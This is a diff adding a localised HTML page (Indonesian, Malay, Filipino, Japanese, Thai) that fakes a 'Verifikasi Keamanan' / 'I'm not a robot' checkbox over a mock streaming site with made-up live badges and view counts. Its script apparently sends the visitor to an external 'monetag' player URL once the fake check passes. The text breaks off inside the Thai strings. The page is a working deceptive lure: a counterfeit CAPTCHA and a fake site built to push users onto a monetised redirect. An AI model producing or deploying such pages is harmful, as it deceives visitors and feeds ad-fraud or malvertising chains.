@@ -1,0 +1,1185 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
+  <title>Verifikasi Keamanan</title>
+  <style>
+    /* ============================================================
+       MOBILE-FIRST VARIABLES
+       ============================================================ */
+    :root {
+      --pad-x: 16px;
+      --nav-h: 52px;
+      --hero-h: 32vh;
+      --row-gap: 12px;
+    }
+
+    @media (min-width: 480px) {
+      :root {
+        --pad-x: 24px;
+        --nav-h: 58px;
+        --hero-h: 38vh;
+        --row-gap: 14px;
+      }
+    }
+
+    @media (min-width: 768px) {
+      :root {
+        --pad-x: 40px;
+        --nav-h: 64px;
+        --hero-h: 44vh;
+        --row-gap: 18px;
+      }
+    }
+
+    @media (max-height: 520px) {
+      :root {
+        --hero-h: 24vh;
+        --nav-h: 48px;
+      }
+    }
+
+    /* ============================================================
+       RESET + BODY
+       ============================================================ */
+    *, *::before, *::after { box-sizing: border-box; }
+
+    html, body { margin: 0; padding: 0; }
+
+    body {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      min-height: 100dvh;
+      padding: 16px;
+      padding-bottom: max(58px, calc(env(safe-area-inset-bottom) + 46px));
+      padding-top: max(16px, env(safe-area-inset-top));
+      font-family: system-ui, -apple-system, 'Segoe UI', Arial, Helvetica,
+                   'Hiragino Sans', 'Yu Gothic UI', 'Noto Sans JP',
+                   'Noto Sans Thai', 'Leelawadee UI', sans-serif;
+      background: #0b0f19;
+      color: #313131;
+      overflow-x: hidden;
+      -webkit-text-size-adjust: 100%;
+    }
+
+    @media (min-width: 480px) {
+      body { padding: 20px; padding-bottom: max(62px, calc(env(safe-area-inset-bottom) + 50px)); }
+    }
+
+    /* Penyesuaian tipografi per-bahasa */
+    html[lang="th"] .label-text { line-height: 1.6; }
+    html[lang="th"] .desc       { line-height: 1.7; }
+    html[lang="ja"] .title,
+    html[lang="ja"] .hero-title { letter-spacing: 0.02em; }
+    html[lang="ja"] .bg-t,
+    html[lang="th"] .bg-t       { font-weight: 700; }
+
+    /* ============================================================
+       BACKGROUND: web streaming viral (tanpa blur)
+       ============================================================ */
+    .bg {
+      position: fixed;
+      inset: 0;
+      z-index: 0;
+      overflow: hidden;
+      background:
+        radial-gradient(1200px 600px at 80% -10%, #1e293b 0%, transparent 60%),
+        radial-gradient(900px 500px at -10% 110%, #111827 0%, transparent 60%),
+        linear-gradient(180deg, #0b0f19 0%, #0a0e17 100%);
+      color: #fff;
+      font-family: inherit;
+      pointer-events: none;
+    }
+
+    /* ---------- NAV ---------- */
+    .bg-nav {
+      position: absolute;
+      top: 0; left: 0; right: 0;
+      height: var(--nav-h);
+      padding: 0 var(--pad-x);
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      background: linear-gradient(180deg, rgba(0,0,0,0.65), transparent);
+    }
+
+    .bg-logo {
+      display: flex;
+      align-items: baseline;
+      font-weight: 800;
+      font-size: 17px;
+      letter-spacing: 0.5px;
+      flex-shrink: 0;
+    }
+    .bg-logo .a { color: #fff; }
+    .bg-logo .b { color: #e11d48; }
+
+    .bg-nav .links {
+      display: flex;
+      gap: 14px;
+      overflow: hidden;
+    }
+    .bg-nav .links span {
+      font-size: 12px;
+      font-weight: 500;
+      color: rgba(255,255,255,0.7);
+      white-space: nowrap;
+      flex-shrink: 0;
+    }
+    .bg-nav .links span.active { color: #fff; font-weight: 700; }
+
+    .bg-nav .links span:nth-child(n+3) { display: none; }
+    @media (min-width: 480px) {
+      .bg-nav .links span:nth-child(n+3) { display: inline; }
+    }
+
+    .bg-nav .avatar {
+      margin-left: auto;
+      width: 30px; height: 30px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #f97316, #e11d48);
+      border: 1px solid rgba(255,255,255,0.25);
+      flex-shrink: 0;
+    }
+
+    /* ---------- HERO ---------- */
+    .bg-hero {
+      position: absolute;
+      top: var(--nav-h);
+      left: 0; right: 0;
+      height: var(--hero-h);
+      overflow: hidden;
+      background:
+        linear-gradient(90deg, rgba(0,0,0,0.8) 0%, rgba(0,0,0,0.2) 60%, transparent 100%),
+        linear-gradient(135deg, #7c2d12 0%, #1e3a8a 50%, #111827 100%);
+    }
+
+    .bg-hero::after {
+      content: "";
+      position: absolute;
+      inset: auto 0 0 0;
+      height: 50%;
+      background: linear-gradient(180deg, transparent 0%, #0b0f19 100%);
+      pointer-events: none;
+    }
+
+    .hero-inner {
+      position: absolute;
+      left: var(--pad-x);
+      right: var(--pad-x);
+      bottom: 14%;
+      z-index: 1;
+      max-width: 420px;
+    }
+
+    .hero-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 5px;
+      padding: 3px 8px;
+      margin-bottom: 8px;
+      background: #e11d48;
+      color: #fff;
+      font-size: 10px;
+      font-weight: 800;
+      letter-spacing: 0.6px;
+      border-radius: 3px;
+    }
+    .hero-badge::before {
+      content: "";
+      width: 6px; height: 6px;
+      border-radius: 50%;
+      background: #fff;
+      animation: pulse 1.5s ease-in-out infinite;
+    }
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.4; }
+    }
+
+    .hero-title {
+      margin: 0 0 6px;
+      font-size: clamp(16px, 4.5vw, 24px);
+      font-weight: 800;
+      line-height: 1.15;
+      color: #fff;
+      max-width: 320px;
+      text-shadow: 0 2px 6px rgba(0,0,0,0.5);
+    }
+
+    .hero-meta {
+      margin: 0 0 10px;
+      font-size: clamp(10px, 2.6vw, 13px);
+      color: rgba(255,255,255,0.85);
+    }
+
+    .hero-btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      padding: 6px 14px;
+      background: #fff;
+      color: #111;
+      font-family: inherit;
+      font-size: 11px;
+      font-weight: 700;
+      border: 0;
+      border-radius: 4px;
+    }
+    @media (min-width: 480px) {
+      .hero-btn { font-size: 12px; padding: 7px 16px; }
+    }
+
+    /* ---------- BODY: baris kartu video ---------- */
+    .bg-body {
+      position: absolute;
+      top: calc(var(--nav-h) + var(--hero-h) + 14px);
+      left: var(--pad-x);
+      right: var(--pad-x);
+      display: flex;
+      flex-direction: column;
+      gap: calc(var(--row-gap) + 6px);
+    }
+
+    .bg-row {
+      display: flex;
+      gap: var(--row-gap);
+      align-items: flex-start;
+    }
+
+    .bg-card {
+      flex: 1;
+      min-width: 0;
+      display: flex;
+      flex-direction: column;
+      gap: 5px;
+    }
+
+    .bg-thumb {
+      position: relative;
+      aspect-ratio: 16 / 9;
+      border-radius: 6px;
+      overflow: hidden;
+      border: 1px solid rgba(255,255,255,0.08);
+    }
+
+    .bg-thumb::after {
+      content: "";
+      position: absolute;
+      top: 50%; left: 50%;
+      width: 0; height: 0;
+      border-style: solid;
+      border-width: 6px 0 6px 10px;
+      border-color: transparent transparent transparent rgba(255,255,255,0.5);
+      transform: translate(-50%, -50%);
+      pointer-events: none;
+    }
+
+    .bg-badge {
+      position: absolute;
+      top: 5px; left: 5px;
+      padding: 1px 5px;
+      font-size: 8px;
+      font-weight: 800;
+      letter-spacing: 0.4px;
+      color: #fff;
+      background: #e11d48;
+      border-radius: 2px;
+      line-height: 1.4;
+    }
+    .bg-badge.trend {
+      background: linear-gradient(135deg, #f97316, #e11d48);
+    }
+
+    .bg-dur {
+      position: absolute;
+      bottom: 5px; right: 5px;
+      padding: 1px 4px;
+      font-size: 8px;
+      color: #fff;
+      background: rgba(0,0,0,0.75);
+      border-radius: 2px;
+      line-height: 1.4;
+    }
+
+    .bg-meta { font-size: 10px; line-height: 1.3; min-width: 0; }
+    .bg-t {
+      font-weight: 700;
+      color: rgba(255,255,255,0.95);
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+    .bg-m {
+      color: rgba(255,255,255,0.6);
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+    @media (min-width: 480px) {
+      .bg-meta { font-size: 11px; }
+      .bg-t { font-weight: 600; }
+    }
+
+    .bg-card:nth-child(1) .bg-thumb { background: linear-gradient(135deg, #7c2d12, #1f2937); }
+    .bg-card:nth-child(2) .bg-thumb { background: linear-gradient(135deg, #1e3a8a, #0f172a); }
+    .bg-card:nth-child(3) .bg-thumb { background: linear-gradient(135deg, #14532d, #1f2937); }
+    .bg-card:nth-child(4) .bg-thumb { background: linear-gradient(135deg, #4c1d95, #0f172a); }
+    .bg-card:nth-child(5) .bg-thumb { background: linear-gradient(135deg, #7f1d1d, #1f2937); }
+
+    .bg-card:nth-child(n+4) { display: none; }
+    @media (min-width: 480px) {
+      .bg-card:nth-child(n+4) { display: flex; }
+      .bg-card:nth-child(n+5) { display: none; }
+    }
+    @media (min-width: 768px) {
+      .bg-card:nth-child(n+5) { display: flex; }
+    }
+
+    /* ---------- Overlay gelap ringan ---------- */
+    .bg-shade {
+      position: fixed;
+      inset: 0;
+      z-index: 1;
+      background:
+        radial-gradient(ellipse at center,
+          rgba(11,15,25,0.55) 0%,
+          rgba(11,15,25,0.75) 60%,
+          rgba(11,15,25,0.85) 100%);
+      pointer-events: none;
+    }
+
+    /* ============================================================
+       KARTU VERIFIKASI
+       ============================================================ */
+    .card {
+      position: relative;
+      z-index: 2;
+      width: 100%;
+      max-width: 420px;
+      padding: 20px 18px;
+      background: #fff;
+      border: 1px solid #e1e4e8;
+      border-radius: 8px;
+      box-shadow:
+        0 8px 28px rgba(0, 0, 0, 0.55),
+        0 0 0 1px rgba(255, 255, 255, 0.04);
+      color: #313131;
+      animation: cardIn 0.28s cubic-bezier(0.2, 0.8, 0.3, 1);
+    }
+
+    @media (min-width: 480px) { .card { padding: 24px; } }
+    @media (min-width: 768px) { .card { max-width: 390px; padding: 28px; } }
+
+    @keyframes cardIn {
+      from { opacity: 0; transform: translateY(8px) scale(0.98); }
+      to   { opacity: 1; transform: none; }
+    }
+
+    .title {
+      margin: 0 0 6px;
+      font-size: clamp(17px, 4.8vw, 21px);
+      font-weight: 600;
+      line-height: 1.25;
+      color: #313131;
+    }
+
+    .desc {
+      margin: 0 0 18px;
+      font-size: clamp(13px, 3.4vw, 14px);
+      line-height: 1.55;
+      color: #686868;
+    }
+
+    @media (min-width: 480px) {
+      .title { margin-bottom: 8px; }
+      .desc  { margin-bottom: 22px; }
+    }
+
+    .challenge {
+      position: relative;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      min-height: 64px;
+      padding: 12px;
+      background: #fafafa;
+      border: 1px solid #d9dfe5;
+      border-radius: 5px;
+      cursor: pointer;
+      user-select: none;
+      -webkit-tap-highlight-color: transparent;
+      transition: border-color 0.15s, background-color 0.15s;
+    }
+    .challenge:hover  { border-color: #b8c0c8; }
+    .challenge:active { background: #f0f2f4; }
+
+    @media (min-width: 480px) {
+      .challenge { min-height: 70px; padding: 14px; gap: 13px; }
+    }
+    @media (min-width: 768px) {
+      .challenge { min-height: 76px; padding: 15px; }
+    }
+
+    .cb {
+      position: absolute;
+      width: 1px; height: 1px;
+      padding: 0; margin: -1px;
+      overflow: hidden;
+      clip: rect(0 0 0 0);
+      white-space: nowrap;
+      border: 0;
+      opacity: 0;
+      pointer-events: none;
+    }
+    .cb:focus-visible + .box {
+      outline: 2px solid #2563eb;
+      outline-offset: 3px;
+    }
+
+    .box {
+      position: relative;
+      width: 26px; height: 26px;
+      flex-shrink: 0;
+      display: grid;
+      place-items: center;
+      background: #fff;
+      border: 2px solid #c1c7d0;
+      border-radius: 4px;
+      transition: border-color 0.2s, background-color 0.2s;
+    }
+    @media (min-width: 480px) {
+      .box { width: 28px; height: 28px; }
+    }
+
+    .tick,
+    .success {
+      position: absolute;
+      inset: 4px;
+      width: calc(100% - 8px);
+      height: calc(100% - 8px);
+      pointer-events: none;
+    }
+    .tick path,
+    .success path {
+      fill: none;
+      stroke: currentColor;
+      stroke-width: 2.6;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+      stroke-dasharray: 22;
+      stroke-dashoffset: 22;
+    }
+    .tick { color: #2563eb; opacity: 0; transition: opacity 0.1s; }
+    .tick path { transition: stroke-dashoffset 0.28s cubic-bezier(0.2, 0.9, 0.3, 1.1) 0.03s; }
+
+    .spinner {
+      position: absolute;
+      inset: 0;
+      display: grid;
+      place-items: center;
+      opacity: 0;
+      transition: opacity 0.15s;
+    }
+    .spinner::before {
+      content: "";
+      width: 15px; height: 15px;
+      border: 2.4px solid #d1d8e0;
+      border-top-color: #2563eb;
+      border-radius: 50%;
+      animation: spin 0.75s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .success {
+      color: #fff;
+      opacity: 0;
+      transform: scale(0.55);
+      transition: opacity 0.12s, transform 0.28s cubic-bezier(0.2, 1.35, 0.4, 1);
+    }
+    .success path { transition: stroke-dashoffset 0.3s ease 0.05s; }
+
+    .challenge.is-checked .box { border-color: #2563eb; }
+    .challenge.is-checked .tick { opacity: 1; }
+    .challenge.is-checked .tick path { stroke-dashoffset: 0; }
+
+    .challenge.is-verifying .box { border-color: #2563eb; }
+    .challenge.is-verifying .tick { opacity: 0; }
+    .challenge.is-verifying .spinner { opacity: 1; }
+
+    .challenge.is-success .box { border-color: #16a34a; background: #16a34a; }
+    .challenge.is-success .tick,
+    .challenge.is-success .spinner { opacity: 0; }
+    .challenge.is-success .success { opacity: 1; transform: scale(1); }
+    .challenge.is-success .success path { stroke-dashoffset: 0; }
+
+    .label-text {
+      flex: 1;
+      min-width: 0;
+      font-size: clamp(13.5px, 3.6vw, 15px);
+      line-height: 1.35;
+      color: #313131;
+    }
+
+    .brand {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 3px;
+      flex-shrink: 0;
+      color: #555;
+      font-size: 10px;
+      line-height: 1.2;
+      text-align: center;
+      max-width: 84px;
+    }
+    .brand strong { color: #2563eb; font-size: 11px; }
+    @media (min-width: 480px) {
+      .brand { font-size: 11px; max-width: 96px; }
+      .brand strong { font-size: 12px; }
+    }
+
+    .status {
+      min-height: 18px;
+      margin-top: 14px;
+      font-size: clamp(12px, 3.2vw, 13px);
+      line-height: 1.5;
+      color: #666;
+      transition: color 0.15s;
+    }
+    .status.success { color: #16803d; font-weight: 500; }
+    @media (min-width: 480px) { .status { margin-top: 16px; } }
+
+    /* ============================================================
+       LANGUAGE BAR
+       ============================================================ */
+    .lang-bar {
+      position: fixed;
+      left: 50%;
+      bottom: max(10px, env(safe-area-inset-bottom));
+      transform: translateX(-50%);
+      z-index: 3;
+      display: flex;
+      gap: 4px;
+      padding: 5px 7px;
+      background: rgba(11, 15, 25, 0.78);
+      border: 1px solid rgba(255, 255, 255, 0.12);
+      border-radius: 999px;
+      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.5);
+      -webkit-backdrop-filter: blur(8px);
+      backdrop-filter: blur(8px);
+      max-width: calc(100vw - 24px);
+      overflow-x: auto;
+      scrollbar-width: none;
+    }
+    .lang-bar::-webkit-scrollbar { display: none; }
+
+    .lang-bar button {
+      appearance: none;
+      border: 0;
+      background: transparent;
+      color: rgba(255, 255, 255, 0.62);
+      font-family: inherit;
+      font-size: 11px;
+      font-weight: 700;
+      letter-spacing: 0.4px;
+      line-height: 1;
+      padding: 7px 10px;
+      border-radius: 999px;
+      cursor: pointer;
+      white-space: nowrap;
+      transition: background-color 0.15s, color 0.15s;
+    }
+    .lang-bar button:hover { color: #fff; }
+    .lang-bar button[aria-pressed="true"] {
+      background: #e11d48;
+      color: #fff;
+    }
+    .lang-bar button:focus-visible {
+      outline: 2px solid #2563eb;
+      outline-offset: 1px;
+    }
+
+    @media (prefers-reduced-motion: reduce) {
+      .card { animation: none; }
+      .spinner::before { animation-duration: 1.4s; }
+      .hero-badge::before { animation: none; }
+      .tick path,
+      .success path,
+      .success,
+      .tick,
+      .spinner { transition-duration: 0.01ms; }
+    }
+  </style>
+</head>
+<body>
+  <!-- ============================================================
+       BACKGROUND: web streaming viral (di-render via JS / i18n)
+       ============================================================ -->
+  <div class="bg" aria-hidden="true">
+    <div class="bg-nav">
+      <div class="bg-logo">
+        <span class="a" id="brandA">NUSA</span><span class="b" id="brandB">STREAM</span>
+      </div>
+      <div class="links" id="navLinks"></div>
+      <div class="avatar"></div>
+    </div>
+
+    <div class="bg-hero">
+      <div class="hero-inner">
+        <span class="hero-badge" id="heroBadge">LIVE NOW</span>
+        <h2 class="hero-title" id="heroTitle">Konser Ambyar Nusantara Malam Ini</h2>
+        <p class="hero-meta" id="heroMeta">🇮🇩 Bangga Lokal · 250rb penonton · Trending #1</p>
+        <button class="hero-btn" id="heroBtn" type="button" tabindex="-1">▶ Tonton Sekarang</button>
+      </div>
+    </div>
+
+    <div class="bg-body" id="bgBody"></div>
+  </div>
+
+  <!-- Overlay gelap ringan -->
+  <div class="bg-shade" aria-hidden="true"></div>
+
+  <!-- ============================================================
+       KARTU VERIFIKASI
+       ============================================================ -->
+  <div class="card" role="dialog" aria-modal="true" aria-labelledby="title">
+    <h1 class="title" id="title">Verifikasi Keamanan</h1>
+    <p class="desc" id="desc">Silakan lakukan verifikasi untuk melanjutkan.</p>
+
+    <label class="challenge" id="challenge">
+      <input type="checkbox" class="cb" id="cb" />
+      <span class="box" aria-hidden="true">
+        <svg class="tick" viewBox="0 0 24 24">
+          <path d="M5 12.5l4.5 4.5L19 7.5" />
+        </svg>
+        <span class="spinner"></span>
+        <svg class="success" viewBox="0 0 24 24">
+          <path d="M5 12.5l4.5 4.5L19 7.5" />
+        </svg>
+      </span>
+      <span class="label-text" id="labelText">Saya bukan robot</span>
+      <span class="brand">
+        <strong id="brandTop">Verify</strong>
+        <span id="brandSub">Security Check</span>
+      </span>
+    </label>
+
+    <div class="status" id="status" role="status" aria-live="polite">
+      Centang kotak di atas untuk melanjutkan.
+    </div>
+  </div>
+
+  <!-- ============================================================
+       PEMILIH BAHASA
+       ============================================================ -->
+  <div class="lang-bar" id="langBar" role="group" aria-label="Bahasa / Language"></div>
+
+  <script>
+    (() => {
+      'use strict';
+
+      // ============================================================
+      // KONFIGURASI
+      // ============================================================
+      const TARGET  = 'https://v-dey.com/player/monetag.html';
+      const LANG_KEY = 'vs_lang';
+
+      const REDUCED = window.matchMedia
+        && window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+
+      const TICK_MS    = REDUCED ? 40  : 180;
+      const VERIFY_MS  = REDUCED ? 150 : 700;
+      const SUCCESS_MS = REDUCED ? 120 : 400;
+
+      // ============================================================
+      // KAMUS BAHASA
+      // video = [judul, meta, durasi, badge?, trend?]
+      // ============================================================
+      const I18N = {
+
+        /* ---------------- INDONESIAN ---------------- */
+        id: {
+          label: 'ID',
+          brand: ['NUSA', 'STREAM'],
+          nav: ['Beranda', 'Trending', 'Live', 'Kategori'],
+          heroBadge: 'LIVE NOW',
+          heroTitle: 'Konser Ambyar Nusantara Malam Ini',
+          heroMeta: '🇮🇩 Bangga Lokal · 250rb penonton · Trending #1',
+          heroBtn: '▶ Tonton Sekarang',
+          videos: [
+            ['Konser Ambyar Spesial', 'Dangdut Nusantara · 45rb nonton', '12:34', 'LIVE'],
+            ['Prank Kocak Bikin Ngakak', 'Komedi Lokal · 2,1jt tayangan', '08:12', '🔥 #1', true],
+            ['Mukbang Seblak Level Dewa', 'Kuliner Nusantara · 890rb tayangan', '15:20', 'BARU'],
+            ['Viral! Aksi Anak SD Bikin Haru', 'Berita Viral · 5,2jt tayangan', '07:45', '🔥 #3', true],
+            ['Review HP Murah Meriah', 'Tekno Indo · 1,4jt tayangan', '22:10'],
+            ['Dangdut Koplo Remix 2024', 'Musik Indo · 12jt tayangan', '1:02:11'],
+            ['Kuliner Street Food Surabaya', 'Jajan Jalanan · 3,4jt tayangan', '18:04', 'VLOG'],
+            ['Lagu Daerah Nusantara', 'Budaya Kita · 2,8jt tayangan', '10:30'],
+            ['Vlog Naik Gunung Bromo', 'Travel Lokal · 1,1jt tayangan', '25:18', '4K'],
+            ['Stand Up Comedy Indonesia', 'Komedi Lokal · 4,5jt tayangan', '14:44'],
+            ['Koplo Viral Trending', 'Musik Indo · 8,9jt tayangan', '55:22', '🔥 #2', true],
+            ['Resep Masakan Padang', 'Dapur Nusantara · 6,2jt tayangan', '09:15'],
+            ['Viral TikTok Compilation', 'Trending Indo · 15jt tayangan', '32:08', '🔥 #4', true],
+            ['Wayang Kulit Full Episode', 'Budaya Kita · 450rb tayangan', '2:14:30'],
+            ['Berita Terkini Hari Ini', 'Berita Viral · 2,3jt tayangan', '06:45', 'NEWS']
+          ],
+          card: {
+            title: 'Verifikasi Keamanan',
+            desc: 'Silakan lakukan verifikasi untuk melanjutkan.',
+            label: 'Saya bukan robot',
+            brandTop: 'Verify',
+            brandSub: 'Security Check',
+            init: 'Centang kotak di atas untuk melanjutkan.',
+            verifying: 'Memverifikasi...',
+            success: 'Verifikasi berhasil. Mengalihkan...'
+          }
+        },
+
+        /* ---------------- MALAY ---------------- */
+        ms: {
+          label: 'MY',
+          brand: ['MY', 'STREAM'],
+          nav: ['Utama', 'Trending', 'Langsung', 'Kategori'],
+          heroBadge: 'LIVE NOW',
+          heroTitle: 'Konsert Ambyar Nusantara Malam Ini',
+          heroMeta: '🇲🇾 Bangga Tempatan · 250k penonton · Trending #1',
+          heroBtn: '▶ Tonton Sekarang',
+          videos: [
+            ['Konsert Ambyar Istimewa', 'Dangdut Nusantara · 45k tontonan', '12:34', 'LIVE'],
+            ['Prank Kelakar Buat Ketawa', 'Komedi Tempatan · 2.1j tontonan', '08:12', '🔥 #1', true],
+            ['Mukbang Seblak Tahap Dewa', 'Kuliner Nusantara · 890k tontonan', '15:20', 'BAHARU'],
+            ['Viral! Aksi Murid Sekolah Bikin Terharu', 'Berita Viral · 5.2j tontonan', '07:45', '🔥 #3', true],
+            ['Ulasan Telefon Murah Berbaloi', 'Tekno MY · 1.4j tontonan', '22:10'],
+            ['Dangdut Koplo Remix 2024', 'Muzik Tempatan · 12j tontonan', '1:02:11'],
+            ['Makanan Street Food Kuala Lumpur', 'Jajan Jalanan · 3.4j tontonan', '18:04', 'VLOG'],
+            ['Lagu Rakyat Nusantara', 'Budaya Kita · 2.8j tontonan', '10:30'],
+            ['Vlog Mendaki Gunung Kinabalu', 'Travel Tempatan · 1.1j tontonan', '25:18', '4K'],
+            ['Stand Up Comedy Malaysia', 'Komedi Tempatan · 4.5j tontonan', '14:44'],
+            ['Koplo Viral Trending', 'Muzik Tempatan · 8.9j tontonan', '55:22', '🔥 #2', true],
+            ['Resepi Nasi Lemak Sedap', 'Dapur Tempatan · 6.2j tontonan', '09:15'],
+            ['Kompilasi TikTok Viral', 'Trending MY · 15j tontonan', '32:08', '🔥 #4', true],
+            ['Wayang Kulit Episod Penuh', 'Budaya Kita · 450k tontonan', '2:14:30'],
+            ['Berita Terkini Hari Ini', 'Berita Viral · 2.3j tontonan', '06:45', 'NEWS']
+          ],
+          card: {
+            title: 'Pengesahan Keselamatan',
+            desc: 'Sila lakukan pengesahan untuk meneruskan.',
+            label: 'Saya bukan robot',
+            brandTop: 'Verify',
+            brandSub: 'Security Check',
+            init: 'Tandakan kotak di atas untuk meneruskan.',
+            verifying: 'Mengesahkan...',
+            success: 'Pengesahan berjaya. Mengalihkan...'
+          }
+        },
+
+        /* ---------------- FILIPINO / PINOY ---------------- */
+        tl: {
+          label: 'PH',
+          brand: ['PINOY', 'STREAM'],
+          nav: ['Home', 'Trending', 'Live', 'Kategorya'],
+          heroBadge: 'LIVE NOW',
+          heroTitle: 'Live Concert Ngayong Gabi',
+          heroMeta: '🇵🇭 Proud Pinoy · 250k manonood · Trending #1',
+          heroBtn: '▶ Panoorin Ngayon',
+          videos: [
+            ['Live Concert Sa Maynila', 'OPM Live · 45k nanonood', '12:34', 'LIVE'],
+            ['Nakakatawang Prank Compilation', 'Lokal na Komedya · 2.1M views', '08:12', '🔥 #1', true],
+            ['Mukbang ng Balut at Sisig', 'Pagkaing Pinoy · 890k views', '15:20', 'BAGO'],
+            ['Viral! Estudyanteng Umantig ng Puso', 'Balitang Viral · 5.2M views', '07:45', '🔥 #3', true],
+            ['Review ng Murang Cellphone', 'Tekno Pinoy · 1.4M views', '22:10'],
+            ['OPM Acoustic Hits 2024', 'Musikang Pinoy · 12M views', '1:02:11'],
+            ['Street Food sa Cebu', 'Pagkaing Kalye · 3.4M views', '18:04', 'VLOG'],
+            ['Kundiman at Harana', 'Kultura Natin · 2.8M views', '10:30'],
+            ['Vlog sa Mt. Pulag', 'Travel Pinoy · 1.1M views', '25:18', '4K'],
+            ['Stand Up Comedy Manila', 'Lokal na Komedya · 4.5M views', '14:44'],
+            ['Viral sa TikTok Trending', 'Trending PH · 15M views', '55:22', '🔥 #2', true],
+            ['Recipe ng Adobo at Sinigang', 'Kusinang Pinoy · 6.2M views', '09:15'],
+            ['Bisita sa Chocolate Hills', 'Travel Pinoy · 2.3M views', '32:08', '🔥 #4', true],
+            ['Pelikulang Pinoy Full Episode', 'Sine Pinoy · 450k views', '2:14:30'],
+            ['Balita Ngayong Araw', 'Balitang Viral · 2.3M views', '06:45', 'NEWS']
+          ],
+          card: {
+            title: 'Pagpapatunay ng Seguridad',
+            desc: 'Mangyaring magpatunay upang magpatuloy.',
+            label: 'Hindi ako robot',
+            brandTop: 'Verify',
+            brandSub: 'Security Check',
+            init: 'Lagyan ng tsek ang kahon sa itaas upang magpatuloy.',
+            verifying: 'Nagpapatunay...',
+            success: 'Matagumpay ang pagpapatunay. Inililipat...'
+          }
+        },
+
+        /* ---------------- JAPANESE ---------------- */
+        ja: {
+          label: 'JP',
+          brand: ['NIPPON', 'STREAM'],
+          nav: ['ホーム', '急上昇', 'ライブ', 'カテゴリ'],
+          heroBadge: 'LIVE NOW',
+          heroTitle: '今夜開催！真夏の音楽フェス',
+          heroMeta: '🇯🇵 日本が誇る · 25万人視聴 · 急上昇 #1',
+          heroBtn: '▶ 今すぐ見る',
+          videos: [
+            ['真夏の音楽フェス 生中継', 'J-POP ライブ · 4.5万人視聴', '12:34', 'LIVE'],
+            ['爆笑！ドッキリ神回まとめ', 'お笑いバラエティ · 210万回再生', '08:12', '🔥 #1', true],
+            ['大食い！ラーメン10杯チャレンジ', 'グルメ日本 · 89万回再生', '15:20', '新着'],
+            ['感動！小学生の合唱コンクール', '話題のニュース · 520万回再生', '07:45', '🔥 #3', true],
+            ['格安スマホ徹底レビュー', 'テック日本 · 140万回再生', '22:10'],
+            ['演歌・歌謡曲 名曲メドレー', '音楽チャンネル · 1200万回再生', '1:02:11'],
+            ['東京グルメ食べ歩き', '食べ歩き旅 · 340万回再生', '18:04', 'VLOG'],
+            ['日本の伝統芸能 特集', '和文化 · 280万回再生', '10:30'],
+            ['富士山 登山Vlog', '旅チャンネル · 110万回再生', '25:18', '4K'],
+            ['お笑いライブ 完全版', 'お笑いバラエティ · 450万回再生', '14:44'],
+            ['TikTokで話題の曲', '急上昇JP · 1500万回再生', '55:22', '🔥 #2', true],
+            ['簡単！本格和食レシピ', '家庭料理 · 620万回再生', '09:15'],
+            ['京都の紅葉さんぽ', '旅チャンネル · 230万回再生', '32:08', '🔥 #4', true],
+            ['アニメ名作 一挙放送', 'アニメ日本 · 45万回再生', '2:14:30'],
+            ['今日のニュースまとめ', 'ニュース速報 · 230万回再生', '06:45', 'NEWS']
+          ],
+          card: {
+            title: 'セキュリティ認証',
+            desc: '続行するには認証を行ってください。',
+            label: '私はロボットではありません',
+            brandTop: '認証',
+            brandSub: 'セキュリティチェック',
+            init: '上のボックスにチェックを入れてください。',
+            verifying: '認証中...',
+            success: '認証に成功しました。転送中...'
+          }
+        },
+
+        /* ---------------- THAI ---------------- */
+        th: {
+          label: 'TH',
+          brand: ['THAI', 'STREAM'],
+          nav: ['หน้าแรก', 'มาแรง', 'ถ่ายทอดสด', 'หมวดหมู่'],
+          heroBadge: 'LIVE NOW',
+          heroTitle: 'คอนเสิร์ตใหญ่คืนนี้',
+          heroMeta: '🇹🇭 ภูมิใจไทย · 250k ผู้ชม · มาแรง #1',
+          heroBtn: '▶ ดูเลย',
+          videos: [
+            ['คอนเสิร์ตใหญ่ถ่ายทอดสด', 'เพลงไทย · 45k กำลังดู', '12:34', 'LIVE'],
+            ['รวมคลิปตลกเรียกเสียงฮา', 'ตลกไทย · 2.1 ล้านวิว', '08:12', '🔥 #1', true],
+            ['มุกแบงค์ส้มตำระดับเทพ', 'อาหารไทย · 890k วิว', '15:20', 'ใหม่'],
+            ['ไวรัล! นักเรียนทำคนทั้งประเทศซึ้ง', 'ข่าวไวรัล · 5.2 ล้านวิว', '07:45', '🔥 #3', true],
+            ['รีวิวสมาร์ทโฟนราคาประหยัด', 'ไอทีไทย · 1.4 ล้านวิว', '22:10'],
+            ['เพลงลูกทุ่งฮิต 2024', 'เพลงไทย · 12 ล้านวิว', '1:02:11'],
+            ['กินเที่ยวสตรีทฟู้ดเยาวราช', 'อาหารข้างทาง · 3.4 ล้านวิว', '18:04', 'VLOG'],
+            ['เพลงพื้นบ้านไทย', 'วัฒนธรรมไทย · 2.8 ล้านวิว', '10:30'],
+            ['Vlog ขึ้นดอยอินทนนท์', 'ท่องเที่ยวไทย · 1.1 ล้านวิว', '25:18', '4K'],
+            ['สแตนด์อัพคอมเมดี้ไทย', 'ตลกไทย · 4.5 ล้านวิว', '14:44'],
+            ['เพลงไวรัล TikTok', 'มาแรงไทย · 15 ล้านวิว', '55:22', '🔥 #2', true],
+            ['สูตรต้มยำกุ้งน้ำข้น', 'ครัวไทย · 6.2 ล้านวิว', '09:15'],
+            ['เที่ยวเชียงใหม่หน้าฝน', 'ท่องเที่ยวไทย · 2.3 ล้านวิว', '32:08', '🔥 #4', true],
+            ['ละครไทยยอดฮิต', 'บันเทิงไทย · 450k วิว', '2:14:30'],
